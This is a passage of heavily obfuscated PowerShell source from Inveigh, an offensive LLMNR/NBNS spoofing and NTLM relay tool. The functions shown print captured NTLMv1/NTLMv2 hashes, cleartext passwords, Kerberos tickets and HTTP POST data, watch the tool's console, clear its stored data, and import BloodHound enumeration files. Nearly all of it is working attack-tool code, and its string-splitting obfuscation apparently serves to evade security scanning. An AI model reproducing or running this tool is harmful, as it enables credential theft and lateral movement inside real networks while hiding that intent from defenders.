                        &("{1}{2}{3}{0}" -f 'ut','W','r','ite-Outp') ${IN`VEIGh}."CON`so`LE_qU`EUE"[0]
                        ${I`N`VeigH}."CO`NSolE_QUE`Ue".("{2}{0}{1}"-f'A','t','Remove').Invoke(0)
                    }

                }

            }
            
        }

    }

    if(${aDId`Ns})
    {
        ${AdiDN`s`_`TAblE_kE`YS`_TE`mP} = ${inveI`gh}."A`DiDns`_TAbLe"."ke`yS"

        foreach(${aD`i`D`Ns_HOsT} in ${AD`Idns`_`TA`BLe_KEy`S_TE`Mp})
        {
            
            if(${In`VE`iGh}."aDidnS`_tA`BLe".${adi`D`NS_Host} -ge 1)
            {
                &("{1}{3}{0}{2}"-f '-Outpu','W','t','rite') ${ADiD`N`s_HO`st}
            }

        }

    }

    if(${aDId`N`sfaILEd})
    {

        ${AdIDns_TABLE`_kE`y`S_t`e`Mp} = ${invE`i`gH}."aDidn`s_Ta`BLe"."k`EyS"

        foreach(${AdI`dN`s`_HOSt} in ${a`d`IdNS`_t`AB`LE_kEYs`_tEMp})
        {
            
            if(${Invei`GH}."adi`DN`s_`TabLe".${aDI`dns`_H`OSt} -eq 0)
            {
                &("{2}{0}{1}{3}" -f '-Out','p','Write','ut') ${a`didnS_HO`sT}
            }

        }

    }

    if(${ke`R`BEr`OSTGt})
    {
        &("{1}{2}{0}"-f'tput','Write-','Ou') ${in`V`EiGH}."kER`Be`RoS_TGt_`lI`st"[${Ker`BE`RoST`gt}]
    }

    if(${kErBe`RosUSErn`A`ME})
    {
        &("{1}{0}{2}"-f 'rite-Out','W','put') ${In`VEi`gh}."kEr`BerOs_T`GT_USERN`Ame`_LIST"
    }

    if(${L`OG})
    {
        &("{1}{0}{2}{3}" -f 'rite','W','-Outpu','t') ${I`N`VEigH}."L`oG"
    }

    if(${ntLm`V1})
    {
        &("{2}{0}{1}{3}" -f '-Out','pu','Write','t') ${inv`eI`gH}."Ntl`Mv1_lI`st"
    }

    if(${Nt`LmV1Un`IQ`Ue})
    {
        ${InVE`I`GH}."ntlmV`1_LI`ST".("{0}{1}" -f'S','ort').Invoke()
        ${NT`lM`V1_`liST_`TEmp} = ${INV`E`IgH}."nt`L`MV1_`LIsT"

        foreach(${uN`Iqu`e_nT`lmv1} in ${ntLmV1`_`LIs`T_te`MP})
        {
            ${uniqUe`_`N`TLM`V1_Ac`c`OUnT} = ${UNiQUE_`NtL`m`V1}.("{1}{2}{0}"-f 'ring','Su','bSt').Invoke(0,${u`NiQUE_N`TL`mV1}.("{0}{1}" -f 'Inde','xOf').Invoke(":",(${UN`iqu`e`_nt`Lmv1}.("{2}{1}{0}"-f 'exOf','nd','I').Invoke(":") + 2)))

            if(${uNique_`NtLMV`1_Ac`Co`UnT} -ne ${u`NiQ`U`E_`NTLMv1_a`CCOUNt_L`ASt})
            {
                &("{0}{3}{1}{2}" -f 'Wri','utpu','t','te-O') ${u`NIQUe`_NTL`mv1}
            }

            ${unI`QUE_`N`TL`mV1_AccO`UNT_`lA`St} = ${uN`iQU`E_N`TlMV`1`_ACCOU`NT}
        }

    }

    if(${nt`Lm`V`1U`seRNAmeS})
    {
        &("{1}{2}{3}{0}" -f'ut','Write','-Ou','tp') ${I`NvEi`GH}."N`T`lmV2_U`sERnAMe_LisT"
    }

    if(${nTL`Mv2})
    {
        &("{0}{2}{1}"-f 'W','te-Output','ri') ${i`NveIgh}."n`TLMV`2_lisT"
    }

    if(${N`TlmV2u`Niq`Ue})
    {
        ${i`Nve`iGH}."ntl`MV2_`LiSt".("{1}{0}" -f't','Sor').Invoke()
        ${ntlmv2_L`i`ST`_`T`eMP} = ${I`N`VEIgh}."nt`lmv`2_l`iST"

        foreach(${uNI`qU`e_NT`lmV2} in ${ntlmv`2_LiSt`_t`emp})
        {
            ${u`NI`QUe_n`TlmV`2`_aCc`OUnt} = ${UN`iqUe_n`T`lM`V2}.("{2}{0}{1}"-f'u','bString','S').Invoke(0,${uN`IqUe_N`TlMv2}.("{1}{0}" -f'Of','Index').Invoke(":",(${UN`Iq`U`E_ntLmv2}.("{1}{0}" -f'Of','Index').Invoke(":") + 2)))

            if(${unIQue_n`TL`mV2_A`cC`OUnT} -ne ${U`Ni`qUe_nTL`mv2`_Acc`oUNt`_L`AST})
            {
                &("{2}{0}{3}{1}"-f 'te-Outp','t','Wri','u') ${UNi`qu`e_nT`LMV2}
            }

            ${Un`I`qUe_ntLMV2`_a`c`c`ount`_lA`st} = ${U`NI`QUE_N`TlM`V2_aC`cou`NT}
        }

    }

    if(${Ntlm`V`2U`se`RNAMEs})
    {
        &("{3}{0}{1}{2}"-f'rite','-O','utput','W') ${i`Nve`Igh}."n`T`lMv2_US`er`Nam`e_`lIst"
    }

    if(${Cl`E`ArT`eXt})
    {
        &("{3}{1}{0}{2}"-f'ut','O','put','Write-') ${iNVE`iGh}."c`LE`ArteXT_Li`st"
    }

    if(${cle`ArTEX`TUnIQ`Ue})
    {
        &("{0}{3}{1}{2}" -f 'Wri','e-','Output','t') ${I`N`VEiGH}."C`lEa`RtexT`_`lIst" | &("{2}{0}{3}{1}"-f't','ique','Ge','-Un')
    }

    if(${p`o`StrEQU`ESt})
    {
        &("{1}{0}{3}{2}" -f'ite-Out','Wr','ut','p') ${I`Nv`EiGh}."pO`St_REqU`EST`_L`I`ST"
    }

    if(${poStR`EqU`eStUNIq`UE})
    {
        &("{0}{1}{2}{3}" -f'W','ri','t','e-Output') ${inV`EI`Gh}."PoSt_R`eqU`ESt_li`ST" | &("{1}{0}{2}" -f'U','Get-','nique')
    }

    if(${Learn`ing})
    {
        &("{0}{1}{2}"-f'Wr','ite-Outp','ut') ${i`NvEIGh}."v`AlI`d_HoSt_L`IsT"
    }

    if(${s`esSI`on})
    {
        ${i} = 0

        while(${i} -lt ${INv`E`IGh}."sEs`SiO`N`_SOcke`T_t`ABle"."CoU`Nt")
        {

            if(!${In`V`EIgH}."Se`sS`iOn_`sOcKeT_T`A`BlE"[${i}]."C`OnNE`Cted")
            {
                ${i`N`VEIgh}."S`eSSioN"[${i}] | &("{3}{0}{2}{1}"-f'her','ect','e-Obj','W') {${_}."S`T`ATuS" = ("{2}{0}{1}"-f'sconnect','ed','di')}
            }
        
            ${I}++
        }

        &("{2}{0}{1}"-f'-O','utput','Write') ${In`VEIGh}."Sess`I`oN" | &("{1}{0}{2}" -f 'Ta','Format-','ble') -AutoSize
    }

    if(${eNuMe`R`AtE})
    {
        &("{2}{1}{3}{0}"-f 't','te-O','Wri','utpu') ${I`Nvei`GH}."E`NUM`erate"
    }

}

function WATcH-`InV`EIGh
{


[CmdletBinding()]
param
( 
    [parameter(mANdaToRy=${f`AlsE})][Switch]${NocOn`sol`eMeS`SA`gE},
    [parameter(MaNdaToRy=${Fa`lse})][ValidateSet("Low",{"{2}{0}{1}" -f'di','um','Me'},"Y")][String]${C`onSOl`eOutP`UT} = "Y",
    [parameter(VAlUefroMrEmAINInGaRgUmenTS=${T`RUe})]${INVaLiD_p`ARame`T`Er}
)

if(${in`Ve`IgH}."T`oOl" -ne 1)
{

    if(${In`VeI`gh}."RU`NNing" -or ${Inv`EigH}."relaY_Ru`NnI`NG")
    {
        
        if(!${n`oC`oNs`O`l`eMeSSage})
        {
            &("{3}{2}{0}{1}"-f 'ut','put','-O','Write') ("{4}{2}{6}{5}{0}{7}{9}{1}{3}{8}"-f 'top','e o',' to','u','[*] Press any key','s',' ',' c','tput','onsol')
        }

        ${I`N`VEiGH}."COnSoLe`_ou`Tp`Ut" = ${TR`Ue}

        :console_loop while(((${iNV`EIgh}."ru`NN`inG" -or ${i`NvEIgh}."RE`LA`Y`_RuNniNg") -and ${i`NVEI`gh}."conSolE_`o`UtP`UT") -or (${Inve`i`Gh}."c`ON`sOLE_QuEuE"."C`OUNt" -gt 0 -and ${i`N`VEigH}."COnSOL`E_oUTP`UT"))
        {

            while(${I`N`Veigh}."C`On`SOL`e_`qUeUE"."C`oUNt" -gt 0)
            {

                switch -wildcard (${I`NvEi`GH}."co`NSOlE_qU`eUE"[0])
                {

                    {${_} -like "?`[`!`]*" -or ${_} -like "?`[-`]*"}
                    {
                        &("{0}{2}{1}"-f'Write-Warn','ng','i') ${InvE`I`gH}."Co`NsOl`E_q`UEUE"[0]
                        ${InV`E`iGh}."CoNs`ole_QuE`UE".("{0}{1}" -f 'Remo','veAt').Invoke(0)
                    }

                    {${_} -like ("{0}{2}{3}{4}{1}"-f '*sp',']','oofer',' disab','led') -or ${_} -like ("{1}{0}{3}{2}"-f'al ','*loc','equest]','r') -or ${_} -like ("{4}{3}{0}{2}{1}"-f 'h','der *','ost hea',' ','*') -or ${_} -like ("{0}{3}{1}{2}"-f '* u','ecei','ved *','ser agent r')}
                    {

                        if(${c`O`NsO`lEOUTpUT} -eq 'Y')
                        {
                            &("{1}{3}{2}{0}" -f't','Write','tpu','-Ou') ${inV`E`iGH}."coNsOLe_`qu`e`UE"[0]
                        }

                        ${inV`eIgh}."cONsOl`E_`qUeue".("{1}{0}" -f'veAt','Remo').Invoke(0)

                    } 

                    {${_} -like ("{2}{3}{0}{4}{1}" -f 's','t]','*resp','on','e sen') -or ${_} -like ("{1}{0}{2}" -f'no','*ig','ring*') -or ${_} -like ("{2}{3}{1}{0}" -f'*',' ','* HTTP*request f','or') -or ${_} -like ("{4}{1}{2}{5}{0}{3}"-f 'request f','P','roxy','or *','* ','*') -or ${_} -like ("{0}{2}{1}" -f'*SY','et*','N pack')}
                    {
                    
                        if(${C`O`NSo`lEOutpUT} -ne "Low")
                        {
                            &("{1}{2}{0}" -f'utput','W','rite-O') ${IN`Ve`IGh}."C`oNsO`L`E_qUeUe"[0]
                        }

                        ${i`N`VEigh}."c`o`NsOLe_qUEUE".("{2}{1}{0}"-f'eAt','mov','Re').Invoke(0)

                    } 

                    ("{2}{1}{0}" -f 'ult','a','def')
                    {
                        &("{0}{2}{1}"-f'Write','put','-Out') ${invE`I`GH}."COnsoL`e_`QUEUe"[0]
                        ${in`VeIGH}."c`O`NsoLe_q`UeuE".("{1}{2}{0}" -f 'veAt','Re','mo').Invoke(0)
                    }

                } 

            }

            if(  ( &("{0}{2}{1}" -f 'VA','E','Riabl') ("aG"+"8N9T") -vAluEo  )::"K`EY`Av`AilAbLE")
            {
                ${In`VE`IGH}."cONsoL`e_oU`TPUT" = ${fA`L`sE}
                BREAK ("{2}{1}{0}"-f'oop','ole_l','cons')
            }

            &("{1}{2}{0}"-f 'Sleep','St','art-') -m 5
        }

    }
    else
    {
        &("{0}{2}{1}" -f 'Wr','t','ite-Outpu') ((("{5}{1}{3}{4}{0}{2}"-f't r','isn','unning','tW','1','[-] Inveigh '))."Re`pLa`Ce"(([chAr]116+[chAr]87+[chAr]49),[STRiNg][chAr]39))
    }

}
else
{
    &("{2}{1}{3}{0}" -f 'ut','-Ou','Write','tp') ("{11}{1}{6}{15}{12}{14}{13}{10}{4}{3}{18}{19}{5}{7}{2}{17}{8}{9}{0}{16}" -f 't','-] Wa','l s','h curr','used wit','l t','t','oo','l','ec','be ','[','igh cann',' ','ot','ch-Inve','ion','e','ent ex','terna')
}

}

function CLeAr-inv`E`i`gh
{


if(${InVe`iGH})
{

    if(!${iN`VEigH}."R`U`NnInG" -and !${i`NVeIGh}."r`E`Lay`_R`UNNInG")
    {
        &("{1}{2}{3}{0}"-f'ble','Re','move-Va','ria') ("{1}{0}"-f'h','inveig') -scope ("{0}{1}" -f 'glob','al')
        &("{3}{0}{1}{2}" -f'e-O','u','tput','Writ') ("{6}{8}{2}{3}{0}{7}{1}{4}{9}{5}" -f'ea','d ','gh d','ata has been cl','from','mory','[+] I','re','nvei',' me')
    }
    else
    {
        &("{2}{0}{1}" -f 'Outpu','t','Write-') ("{7}{10}{0}{1}{9}{4}{5}{6}{3}{8}{2}"-f 'Invei','g','eigh','Cl',' befor','e ru','nning ','[-] Run S','ear-Inv','h','top-')
    }

}

}

function cONV`eRt`To-i`NvEIGH
{
    

    [CmdletBinding()]
    param
    ( 
        [parameter(mAnDatoRy=${fA`lse})][ValidateScript({&("{2}{1}{0}"-f 'Path','-','Test') ${_}})][String]${c`o`MPutErs},
        [parameter(mandatOrY=${Fa`LSe})][ValidateScript({&("{0}{1}{2}"-f'T','est-','Path') ${_}})][String]${SE`SsiO`Ns},
        [parameter(mAnDaTORy=${FA`L`sE})][ValidateScript({&("{3}{2}{1}{0}" -f 'h','at','P','Test-') ${_}})][String]${gRo`UpS},
        [parameter(mandatoRY=${f`ALSe})][Switch]${d`NS},
        [parameter(vaLUeFROmrEMaINingaRgUMents=${T`Rue})]${INvA`L`ID_`ParaMETEr}
    )

    if(!${COmpu`T`ErS} -and !${S`essI`oNs} -and !${GR`o`Ups})
    {
        &("{2}{3}{0}{1}"-f 'e-Ou','tput','Wr','it') ("{4}{12}{0}{1}{8}{11}{10}{5}{15}{2}{9}{14}{7}{3}{6}{13}" -f'a Blood','Hou','or sess',' ','Speci','ou','fi','ON','nd','ions ','s, gr',' computer','fiy ','le','JS','ps, ')
        throw
    }

    if(${iNVei`gH}."rU`NninG" -or ${INv`E`igh}."R`Ela`Y_r`UnNiNg")
    {
        &("{0}{1}{2}"-f 'W','ri','te-Output') ("{3}{6}{9}{1}{12}{5}{16}{10}{4}{13}{2}{7}{11}{0}{8}{14}{15}" -f 'To-','eigh b','a wi','Run','ing ','mp',' Stop-In','th Co','In','v','t','nvert','efore i','dat','ve','igh','or')
        throw
    }

    if(!${iN`VE`igH})
    {
        ${GLoBal`:i`NV`e`iGH} =   (&("{2}{0}{1}" -f't-vA','rIABLe','Ge') p5K  -VaL)::("{1}{2}{0}{3}"-f'ron','Sync','h','ized').Invoke(@{})
        ${I`N`VEIgH}."c`LEArTexT`_lIST" = &("{0}{1}{2}"-f'New-Obj','e','ct') ("{3}{1}{4}{7}{5}{8}{2}{6}{0}"-f 'st','m.C','rr','Syste','ollec','on','ayLi','ti','s.A')
        ${I`NveIgh}."En`UMeRA`TE" = &("{0}{2}{1}" -f 'New-','ject','Ob') ("{4}{2}{7}{1}{3}{0}{5}{8}{6}" -f 's.Ar','lecti','C','on','System.','ra','st','ol','yLi')
        ${inVE`Igh}."Ip_CaP`T`UR`E_`LiST" = &("{0}{2}{3}{1}" -f 'Ne','t','w','-Objec') ("{6}{2}{1}{4}{5}{0}{3}{7}" -f'r','le','ol','ra','ct','ions.A','System.C','yList')
        ${In`VE`iGH}."L`OG" = &("{2}{1}{0}" -f 't','ec','New-Obj') ("{4}{1}{5}{0}{6}{2}{3}"-f '.Co','yste','i','ons.ArrayList','S','m','llect')
        ${iNV`EIGh}."kER`BeROs`_T`Gt_LISt" = &("{2}{0}{1}" -f 'je','ct','New-Ob') ("{7}{3}{0}{8}{5}{4}{2}{6}{1}"-f 't','t','Li','ystem.Collec','Array','ns.','s','S','io')
        ${i`NV`eIGh}."kE`RbeR`O`s_tGT_uSerNaME_`l`iST" = &("{3}{2}{0}{1}" -f'Obj','ect','ew-','N') ("{8}{3}{6}{4}{7}{5}{0}{2}{1}"-f's.Arra','st','yLi','C','lle','tion','o','c','System.')
        ${INvEi`gh}."n`TLMv1_`LI`sT" = &("{2}{3}{1}{0}" -f'ct','Obje','Ne','w-') ("{0}{4}{1}{7}{5}{6}{2}{3}" -f'Syst','m','s.ArrayLi','st','e','lectio','n','.Col')
        ${I`Nve`Igh}."nTLmV1`_U`S`e`Rname_lI`St" = &("{0}{1}{2}{3}"-f 'N','ew-','Obje','ct') ("{1}{0}{5}{4}{7}{6}{2}{3}"-f 'Co','System.','Lis','t','ions','llect','rray','.A')
        ${iNvE`i`Gh}."nt`LmV2_`Li`St" = &("{0}{1}{2}{3}" -f 'Ne','w-Obje','c','t') ("{3}{0}{4}{7}{6}{5}{1}{2}"-f 'ystem','ArrayL','ist','S','.','s.','n','Collectio')
        ${IN`V`eIGH}."N`T`lMV2_`USEr`Na`me_LI`ST" = &("{0}{2}{1}" -f 'Ne','-Object','w') ("{1}{2}{3}{5}{4}{0}"-f 'st','S','ys','tem.C','ArrayLi','ollections.')
        ${I`NVeI`Gh}."po`s`T_`ReQ`UeSt_`LisT" = &("{0}{2}{1}" -f'New','Object','-') ("{1}{7}{6}{0}{5}{4}{2}{3}"-f'lecti','System','ray','List','s.Ar','on','Col','.')
        ${iNv`e`iGH}."vaLid_HOS`T_`LISt" = &("{0}{1}{2}"-f 'N','e','w-Object') ("{4}{2}{0}{3}{1}{6}{7}{5}" -f 'tem.Co','lection','s','l','Sy','yList','s.','Arra')
        ${In`VEI`gH}."a`DIDns_`TaBLe" =   (  &("{0}{1}{2}"-f'vARi','Abl','e')  ("p"+"5K") -VaLueonlY )::("{2}{0}{1}" -f 'nc','hronized','Sy').Invoke(@{})
        ${INv`Eigh}."r`EL`A`y_P`RiVILEGe_T`AbLe" =  $p5K::("{1}{0}{3}{2}"-f 'nchron','Sy','d','ize').Invoke(@{})
        ${INV`eI`gh}."RELA`Y_f`AileD_l`OGin_`TAb`Le" =   (  &('gi')  ("vARiA"+"bL"+"E:p5"+"K")  ).vaLUE::("{1}{3}{0}{2}" -f 'i','Synch','zed','ron').Invoke(@{})
        ${i`Nvei`GH}."rElaY`_hi`sToR`Y_TaB`le" =   $P5K::("{3}{2}{0}{1}" -f'e','d','ynchroniz','S').Invoke(@{})
        ${In`V`eIGh}."R`EqUESt_T`ABLE" =   ( &("{0}{1}{2}"-f'varI','a','ble')  ("P"+"5k") ).VAlUe::("{1}{0}{2}"-f'z','Synchroni','ed').Invoke(@{})
        ${InVE`iGH}."s`EsSI`oN_s`ock`et`_table" =  $P5K::("{0}{1}{2}"-f 'Syn','chro','nized').Invoke(@{})
        ${I`N`VeiGh}."s`ES`sioN_TAblE" =   (&("{0}{1}" -f 'dI','r') ('vari'+'Able:'+'p5K') ).VALue::("{1}{2}{0}" -f 'onized','S','ynchr').Invoke(@{})
        ${i`N`VeIgh}."sEssi`On`_m`ES`sAGe_id_`Ta`BLE" =   (  &("{0}{1}" -f 'vARiA','BlE') ("P5"+"k") -VaLueoNLY  )::("{0}{1}{2}"-f 'S','y','nchronized').Invoke(@{})
        ${iN`V`eigH}."s`esSIoN_lOcK_`TA`BLE" =  $p5K::("{0}{3}{1}{2}" -f 'S','nchr','onized','y').Invoke(@{})
        ${i`N`VEigh}."sMb_SeSS`IOn_`TA`BlE" =   $p5k::("{2}{1}{0}"-f'ed','oniz','Synchr').Invoke(@{})
        ${InvE`i`gh}."DomAin_`M`A`ppiNg`_tabLe" =   (&("{3}{0}{1}{2}" -f 'ILdI','te','M','Get-ch') vARiaBLE:P5K ).vaLUe::("{1}{2}{0}"-f'onized','Sync','hr').Invoke(@{})
        ${I`Nve`igH}."g`R`OUP_Table" =   ( &("{0}{1}"-f 'gC','I') VArIAbLE:P5k).VALUe::("{1}{3}{2}{0}" -f'nized','S','ro','ynch').Invoke(@{})
        ${I`NVe`Igh}."s`E`SS`ION_c`oUNT" = 0
        ${INV`E`igH}."sEsSI`on" = @()
    }

    function New-re`layENu`mObj`eCt
    {
        param (${i`p},${hOS`TnamE},${dN`SDom`A`in},${NetbIOSd`O`MAin},${s`e`ssioNS},${ad`MIn`IsTRato`R`Us`ers},${A`DmIni`ST`R`A`ToRgroUps},
            ${P`RIvIle`g`eD},${sH`Ar`ES},${n`e`TsEsSIoNs},${NEtS`E`SSI`ONSMAPpeD},${LO`Ca`lu`SERS},${Sm`B2},${sIGN`I`NG},${sMBS`ErV`Er},${DNS`RE`C`OrD},
            ${iPV6on`LY},${tar`g`eTeD},${eN`UMEr`ATe},${EXEC`U`Te})

        if(${s`ES`sIoNs} -and ${S`e`sSiONS} -isnot [Array]){${SeS`SIO`Ns} = @(${Sessio`Ns})}
        if(${Adm`INiStRa`To`R`UsERs} -and ${ADminiS`Tra`T`O`RUs`ERs} -isnot [Array]){${Ad`MINIsTrAto`RU`SeRs} = @(${ADMINIs`T`Ra`TOR`US`ers})}
        if(${admi`NIsTra`Torgr`OuPS} -and ${Admini`St`RAtORGR`o`U`ps} -isnot [Array]){${ad`M`INis`TraTorGR`OU`pS} = @(${AdminI`S`T`RaTor`gRO`UPS})}
        if(${PRIV`Il`e`ged} -and ${pr`Ivil`eg`ED} -isnot [Array]){${Pri`Vileg`ed} = @(${Pr`Iv`IleG`ed})}
        if(${S`Ha`RES} -and ${ShA`R`es} -isnot [Array]){${SH`A`RES} = @(${sHA`Res})}
        if(${nET`s`ESSioNs} -and ${n`E`TSesSi`oNs} -isnot [Array]){${n`EtSES`S`ions} = @(${NeT`sEs`S`IonS})}
        if(${N`E`TS`ESSi`ONSmaPpeD} -and ${ne`TSESSI`oNSM`AP`ped} -isnot [Array]){${nET`SESs`iOnS`mapp`Ed} = @(${n`ETs`es`sI`onSmAP`Ped})}
        if(${lOcA`Lu`sers} -and ${LO`Ca`Lu`SeRS} -isnot [Array]){${LocA`LuS`ers} = @(${LOCAlu`S`ERS})}

        ${rELaY_o`BjE`cT} = &("{0}{2}{1}"-f'New-O','ct','bje') ("{1}{2}{0}"-f'ect','PS','Obj')
        &("{0}{3}{1}{2}" -f 'A','d-','Member','d') -InputObject ${rEla`Y_O`B`J`eCT} -MemberType ("{0}{2}{1}" -f 'NotePr','erty','op') -Name ("{0}{1}" -f'Inde','x') ${i`Nv`EIgH}."enUm`e`RAtE"."cO`Unt"
        &("{0}{3}{2}{1}" -f 'Add','mber','Me','-') -InputObject ${rE`l`AY_ObjECT} -MemberType ("{1}{0}{2}" -f 'o','N','teProperty') -Name "IP" ${iP}
        &("{0}{2}{1}" -f'Add','Member','-') -InputObject ${ReLaY_oB`j`eCt} -MemberType ("{0}{1}{2}"-f'Note','Prop','erty') -Name ("{2}{0}{1}" -f'am','e','Hostn') ${hOStN`AmE}
        &("{0}{2}{1}"-f'A','mber','dd-Me') -InputObject ${R`ElaY`_obJECT} -MemberType ("{1}{0}{2}" -f 'eProp','Not','erty') -Name ("{1}{2}{0}" -f' Domain','DN','S') ${dN`SdOmA`in}
        &("{3}{1}{0}{2}" -f '-Memb','dd','er','A') -InputObject ${R`eLaY_`O`BJeCT} -MemberType ("{1}{3}{2}{0}" -f'y','Not','ert','eProp') -Name ("{2}{0}{3}{1}"-f'etBIOS Do','n','n','mai') ${n`e`TbIosDoM`Ain}
        &("{0}{2}{1}"-f'Add-Mem','er','b') -InputObject ${R`eLAy_Ob`J`eCt} -MemberType ("{2}{1}{0}" -f 'erty','Prop','Note') -Name ("{2}{0}{1}"-f'ess','ions','S') ${seS`siONs}
        &("{3}{2}{1}{0}"-f'r','Membe','-','Add') -InputObject ${rel`A`y_`obje`Ct} -MemberType ("{0}{3}{1}{2}"-f 'No','ePro','perty','t') -Name ("{4}{2}{1}{3}{0}"-f's','r Use','inistrato','r','Adm') ${AD`M`InIS`TR`AT`oRuS`ers}
        &("{1}{2}{0}"-f 'er','Ad','d-Memb') -InputObject ${RElAY_o`BJe`Ct} -MemberType ("{2}{3}{1}{0}"-f 'erty','op','Not','ePr') -Name ("{3}{4}{2}{1}{0}{5}"-f 'rou',' G','r','Administr','ato','ps') ${ADMINI`StR`AT`or`grou`Ps}
        &("{1}{2}{3}{0}"-f 'r','Add-M','em','be') -InputObject ${RE`L`AY_ObJeCT} -MemberType ("{0}{2}{1}" -f 'NoteP','erty','rop') -Name ("{2}{0}{1}"-f 'i','leged','Priv') ${PR`iVilEg`eD}
        &("{0}{2}{1}{3}"-f 'A','Membe','dd-','r') -InputObject ${rELa`y_Ob`J`E`CT} -MemberType ("{0}{2}{1}"-f'N','operty','otePr') -Name ("{2}{0}{1}"-f 'ar','es','Sh') ${ShAr`es}
        &("{2}{0}{1}" -f 'emb','er','Add-M') -InputObject ${RE`LaY_obj`e`ct} -MemberType ("{0}{2}{1}"-f'N','y','otePropert') -Name ("{0}{1}{2}"-f 'N','etSession','s') ${N`ETsEss`IONs}
        &("{0}{1}{2}"-f'A','dd-M','ember') -InputObject ${REL`Ay_o`B`JE`Ct} -MemberType ("{0}{2}{1}"-f 'N','Property','ote') -Name ("{2}{1}{3}{0}" -f 'ed','Sessio','Net','ns Mapp') ${neTS`eS`sio`N`SM`APPED}
        &("{1}{0}{3}{2}" -f'em','Add-M','r','be') -InputObject ${reLay_`Ob`JEcT} -MemberType ("{2}{1}{0}" -f 'rty','tePrope','No') -Name ("{0}{2}{3}{1}"-f'L','s','ocal U','ser') ${lO`cAl`UserS}
        &("{0}{1}{2}"-f 'Ad','d-Me','mber') -InputObject ${R`E`lAy`_oBjecT} -MemberType ("{2}{1}{0}{3}" -f 'Prop','te','No','erty') -Name ("{0}{1}" -f'SMB2.','1') ${sm`B2}
        &("{1}{2}{0}"-f'mber','A','dd-Me') -InputObject ${R`E`lay_O`BJEcT} -MemberType ("{0}{2}{1}{3}"-f 'No','o','tePr','perty') -Name ("{0}{2}{1}" -f'Si','ng','gni') ${s`igNING}
        &("{2}{1}{0}"-f 'er','d-Memb','Ad') -InputObject ${R`elay_`O`BJEct} -MemberType ("{2}{1}{0}"-f'ty','oper','NotePr') -Name ("{0}{1}{2}"-f'SMB',' S','erver') ${S`mbSE`RVER}
        &("{0}{2}{3}{1}"-f 'Add-','er','M','emb') -InputObject ${Re`lAy_`objE`Ct} -MemberType ("{1}{0}{2}"-f 'Prop','Note','erty') -Name ("{2}{1}{0}" -f 'ord','NS Rec','D') ${d`Ns`REcORd}
        &("{0}{2}{1}" -f 'Add-','r','Membe') -InputObject ${r`eLAY_`objECT} -MemberType ("{3}{1}{0}{2}" -f 'Proper','ote','ty','N') -Name ("{2}{1}{0}"-f'ly','v6 On','IP') ${iP`V6On`ly}
        &("{2}{1}{0}"-f'er','mb','Add-Me') -InputObject ${rELaY_`OB`J`ECT} -MemberType ("{1}{3}{2}{0}"-f'rty','Note','e','Prop') -Name ("{0}{2}{1}"-f 'Tar','ted','ge') ${TarGe`T`Ed}
        &("{2}{1}{0}"-f 'ember','-M','Add') -InputObject ${ReLa`y`_ob`JeCT} -MemberType ("{3}{1}{2}{0}" -f 'ty','op','er','NotePr') -Name ("{2}{1}{0}"-f'e','t','Enumera') ${e`N`UMerAte}
        &("{2}{1}{0}" -f'Member','-','Add') -InputObject ${R`eLay_OB`ject} -MemberType ("{2}{1}{3}{0}"-f'perty','tePr','No','o') -Name ("{2}{1}{0}" -f 'ecute','x','E') ${e`Xe`Cute}
        
        return ${rel`A`y`_oBjEcT}
    }

    function Get-`dnSen`TRy([String]${hOS`TN`AME})
    {

        try
        {
            ${I`p_`LiSt} =   $3yVh::("{2}{1}{0}{3}"-f 's','Ho','Get','tEntry').Invoke(${HoS`TnA`ME})

            foreach(${en`Try} in ${ip_L`I`ST}."a`ddrE`SSLi`sT")
            {

                if(!${Ent`RY}."iSipV`6LinKlO`CAl")
                {
                    ${i`P} = ${En`TRy}."IpA`D`DREsst`ostRing"
                }

            }
                    
        }
        catch
        {
            ${I`p} = ${N`ULL}
        }

        return ${ip}
    }

    
    function invokE-pa`R`SEi`TeM(${J`SO`NITEm}) 
    {

        if(${Jso`NIt`eM}."p`SoB`jECT"."TYPE`N`AmeS" -match ("{1}{0}" -f'rray','A')) 
        {
            return &("{1}{3}{5}{2}{4}{0}" -f'nArray','I','s','nv','o','oke-ParseJ')(${JS`oNIt`Em})
        }
        elseif(${Js`on`item}."P`SObjecT"."t`YpEN`AMEs" -match ("{1}{2}{0}"-f'ary','Di','ction')) 
        {
            return &("{0}{3}{4}{1}{5}{2}" -f'I','eJsonOb','ct','n','voke-Pars','je')([HashTable]${jS`oNI`Tem})
        }
        else 
        {
            return ${j`Sonit`em}
        }

    }

    function i`NvokE-pA`RsEjsoN`O`BJecT(${Js`oN`oBjEcT}) 
    {
        ${REsU`LT} = &("{2}{1}{0}"-f 'ect','bj','New-O') -TypeName ("{2}{0}{1}{3}" -f 'stom','Ob','PSCu','ject')

        foreach(${K`eY} in ${jso`NObJ`ect}."Ke`Ys") 
        {
            ${I`TEM} = ${jSo`NOB`jeCt}[${k`EY}]

            if (${i`TEm}) 
            {
                ${pArs`eD_I`TeM} = &("{1}{3}{0}{2}" -f 'It','Invoke-Pa','em','rse') ${i`Tem}
            }
            else 
            {
                ${par`sEd_i`Tem} = ${n`UlL}
            }

            ${R`EsUlT} | &("{2}{1}{0}" -f 'ember','-M','Add') -MemberType ("{0}{2}{1}"-f 'Not','Property','e') -Name ${k`EY} -Value ${PaR`Se`D_`ITeM}
        }

        return ${ReS`UlT}
    }

    function inVOKe-P`A`Rse`JsOn`Ar`RAy(${JSOn`ARr`Ay}) 
    {
        ${ReS`U`lt} = @()
        ${sto`pWAtCh_p`Rogr`EsS} =   ( &("{1}{2}{0}" -f 'le','VarI','Ab')  1np).VALuE::("{1}{0}"-f 'rtNew','Sta').Invoke()
        ${i} = 0

        ${jSoN`Arr`AY} | &("{2}{0}{1}{3}" -f'ac','h-O','ForE','bject') -Process {

            if(${S`T`oP`wAtcH_PR`oGr`ESs}."eLap`s`eD"."TOTalM`iLL`IsE`CoNds" -ge 500)
            {
                ${PeRceNt_c`o`MP`LEt`e_CaLCuLaT`I`on} =  (&("{1}{0}" -f 'ci','g') VArIABlE:m3Q).vAluE::("{0}{2}{1}" -f 'Trun','ate','c').Invoke(${i} / ${J`so`NarRAy}."Co`UNt" * 100)

                if(${PeR`cEN`T_c`oM`pLeT`e`_CAL`C`ULatioN} -le 100)
                {
                    &("{2}{1}{0}"-f'rogress','-P','Write') -Activity ("{1}{3}{2}{0}"-f 'N','Par',' JSO','sing') -Status ("$percent_complete_calculation% "+'Com'+'ple'+'te:') -PercentComplete ${PErc`Ent_`C`OMPL`E`TE_C`Alcu`L`AtIoN} -ErrorAction ("{2}{0}{3}{1}"-f'i','entlyContinue','S','l')
                }

